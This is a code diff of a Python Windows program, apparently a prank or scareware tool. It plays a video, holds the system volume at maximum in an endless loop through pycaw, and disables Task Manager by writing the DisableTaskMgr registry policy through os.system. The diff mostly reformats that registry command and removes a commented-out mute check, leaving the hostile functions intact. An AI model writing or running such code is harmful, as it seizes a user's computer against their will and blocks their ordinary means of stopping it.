@@ -11,15 +11,6 @@ from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
-
-# def is_system_muted():
-#     devices = AudioUtilities.GetSpeakers()
-#     interface = devices.Activate(
-#         IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-#     volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
-#     return volume_interface.GetMute()
-
-
 def set_videos(volume):
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(
@@ -27,7 +18,6 @@ def set_videos(volume):
     volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
     # 设置音量（0.0到1.0之间的浮点数）
     volume_interface.SetMasterVolumeLevelScalar(volume, None)
-
 
 def get_supported_mime_types():
     result = []
@@ -52,17 +42,13 @@ class MainWindow(QMainWindow):
         self._player.setSource(QUrl.fromLocalFile(self.pt))
         self._player.play()
 
-
 def ts():
 
     while True:
         set_videos(1.0)
 
-
 def disable_task_manage(num):
-    os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft'
-              '\Windows\CurrentVersion\Policies\System" /v DisableTask'
-              f'Mgr /t REG_DWORD /d {num} /f')
+    os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')
 
 
 if __name__ == '__main__':
